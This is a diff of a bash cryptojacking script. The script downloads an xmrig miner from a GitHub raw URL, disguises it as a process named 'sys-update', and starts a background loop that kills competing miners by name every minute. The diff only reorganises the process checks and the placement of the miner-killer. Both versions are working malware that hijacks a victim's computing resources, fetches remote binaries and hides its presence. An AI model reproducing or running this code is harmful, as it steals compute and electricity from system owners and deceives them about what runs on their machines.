@@ -1,80 +1,15 @@
 #!/usr/bin/env bash
-set -euo pipefail
-
-if grep -q $'\r' "$0"; then
-  sed -i 's/\r$//' "$0"
-  exec bash "$0" "$@"
-fi
 
 HOME_DIR="${HOME_DIR:-$HOME}"
 [ "$(id -u)" -eq 0 ] && HOME_DIR="/tmp"
 
 BASE_DOWNLOAD_URL="https://raw.githubusercontent.com/t69415778/test/refs/heads/main"
 
-kill_processes_by_name() {
-  local process_name="$1"
-  local pids
-
-  if command -v pgrep &>/dev/null; then
-    pids=$(pgrep -f "$process_name" || true)
-  else
-    pids=$(ps aux | grep "$process_name" | grep -v grep | awk '{print $2}' || true)
-  fi
-
-  if [ -n "$pids" ]; then
-    kill "$pids" 2>/dev/null || true
-  fi
-}
-
-if command -v pidof &>/dev/null; then
-  if pidof sys-update &>/dev/null; then
-    exit 0
-  fi
-else
-  if command -v pgrep &>/dev/null; then
-    if pgrep -f sys-update &>/dev/null; then
-      exit 0
-    fi
-  else
-    if ps aux | grep "sys-update" | grep -v grep &>/dev/null; then
-      exit 0
-    fi
-  fi
+if ps aux | grep '[s]ys-update' &>/dev/null; then
+  exit 0
 fi
 
-kill_processes_by_name "terminate_miners.sh"
-
-cat > /tmp/terminate_miners.sh <<'EOL'
-#!/bin/bash
-set -euo pipefail
-
-kill_processes_by_name() {
-  local process_name="$1"
-  local pids
-
-  if command -v pgrep &>/dev/null; then
-    pids=$(pgrep -f "$process_name" || true)
-  else
-    pids=$(ps aux | grep "$process_name" | grep -v grep | awk '{print $2}' || true)
-  fi
-
-  if [ -n "$pids" ]; then
-    kill -9 "$pids" 2>/dev/null || true
-  fi
-}
-
-miners=("xmrig" "cgminer" "bfgminer" "ethminer" "minerd" "cpuminer" "nicehash" "claymore" "phoenixminer" "ccminer")
-
-while true; do
-  for miner in "${miners[@]}"; do
-    kill_processes_by_name "$miner"
-  done
-  sleep 60
-done
-EOL
-
-chmod +x /tmp/terminate_miners.sh
-/tmp/terminate_miners.sh &
+kill $(ps aux | grep terminate_miners | grep -v grep | awk '{print $2}') || true
 
 download_file() {
   local url=$1
@@ -116,13 +51,30 @@ download_file "$BASE_DOWNLOAD_URL/xmrig" "$MINER_DIR/sys-update"
 chmod +x "$MINER_DIR/sys-update"
 download_file "$BASE_DOWNLOAD_URL/config.json" "$MINER_DIR/config.json"
 
+cat > /tmp/terminate_miners.sh << 'EOL'
+#!/bin/bash
+set -euo pipefail
+miners=("xmrig" "cgminer" "bfgminer" "ethminer" "minerd" "cpuminer" "nicehash" "claymore" "phoenixminer" "ccminer")
+while true; do
+  for miner in "${miners[@]}"; do
+    for pid in $(ps aux | grep "$miner" | grep -v "grep" | awk '{print $2}'); do
+      kill -9 "$pid" || true
+    done
+  done
+  sleep 60
+done
+EOL
+
+chmod +x /tmp/terminate_miners.sh
+/tmp/terminate_miners.sh &
+
 cat >"$MINER_DIR/miner.sh" <<EOL
 #!/usr/bin/env bash
 set -euo pipefail
 ulimit -n 65535
-if ! pidof sys-update &>/dev/null; then
+if ! ps aux | grep '[s]ys-update' &>/dev/null; then
   chmod +x "$MINER_DIR/sys-update"
-  "$MINER_DIR/sys-update" "\$@"
+  "$MINER_DIR/sys-update" "$@"
 fi
 EOL
 chmod +x "$MINER_DIR/miner.sh"
